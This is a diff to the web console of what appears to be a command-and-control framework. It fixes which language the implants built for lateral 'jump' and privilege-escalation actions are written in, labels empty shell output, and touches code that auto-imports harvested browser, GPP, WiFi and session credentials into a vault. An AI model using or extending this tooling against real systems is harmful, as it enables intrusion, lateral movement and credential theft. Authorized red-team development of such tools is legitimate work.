@@ -3948,7 +3948,7 @@ async function runCtxAction(act) {
             openConsoleFor(aid);
             addConsoleOutputForAgent(aid, `[jump] Building ${outName} → ${serverURL}…`, '', null);
             const buildR = await api('POST', '/api/build', {
-              lang: isSSH ? 'go' : preferredLang('http'), format: fmt, transport: 'http',
+              lang: isSSH ? 'go' : preferredLang('http', agnt?.language), format: fmt, transport: 'http',
               server_url: serverURL,
               sleep_sec: agnt?.sleep_sec || 5, jitter_pct: agnt?.jitter_pct ?? 10,
               output_name: outName,
@@ -4237,7 +4237,10 @@ async function runCtxAction(act) {
               const serverURL = `${scheme}://${c2host}:${portMap[transport]||'8080'}`;
               addConsoleOutputForAgent(aid, `[privesc] Building ${outName} → ${serverURL}…`, '', null);
               const buildR = await api('POST', '/api/build', {
-                lang: preferredLang(transport), format:'exe', transport, server_url: serverURL,
+                // Spawn-as-user must preserve the implementation language of
+                // the selected parent.  Falling back only to localStorage
+                // silently built a Go child for C/Nim/Rust parents.
+                lang: preferredLang(transport, agnt?.language), format:'exe', transport, server_url: serverURL,
                 sleep_sec: agnt?.sleep_sec||5, jitter_pct: agnt?.jitter_pct??10,
                 output_name: outName,
               });
@@ -11384,7 +11387,10 @@ async function pollResult(taskID, agentID) {
           delete pollTimers[key];
           return;
         }
-        addConsoleOutputForAgent(aid, out || (err ? '' : '[done]'), err, r.data.created_at);
+        // Do not disguise an empty SHELL capture as a successful command.
+        const shown = out || (err ? '' :
+          (r.data.task_type === 'SHELL' ? '[empty output]' : '[done]'));
+        addConsoleOutputForAgent(aid, shown, err, r.data.created_at);
         // Auto-import GPP / WiFi / browser credentials to vault
         const _vaultTypes = ['BROWSER_CREDS', 'GPP_PASSWORDS', 'WIFI_CREDS', 'SESSION_CREDS'];
         if (_vaultTypes.includes(r.data.task_type) && out && !err) {
@@ -11677,12 +11683,15 @@ function setImplantLang(lang) {
   }
 }
 
-// Returns the user's preferred agent lang, with optional override for SMB.
+// Returns the preferred child language.  The parent agent wins so a lateral
+// child is actually built with the implementation the operator selected.
 function preferredLang(forTransport, parentLang) {
   let lang = parentLang || 'nim';
   if (!parentLang) {
     try { lang = localStorage.getItem('eg_agent_lang') || 'nim'; } catch(_) {}
   }
+  // Rust has no SMB pipe server; keep the existing safe fallback for SMB.
+  if (lang === 'rust' && forTransport === 'smb') return 'go';
   return lang;
 }
 
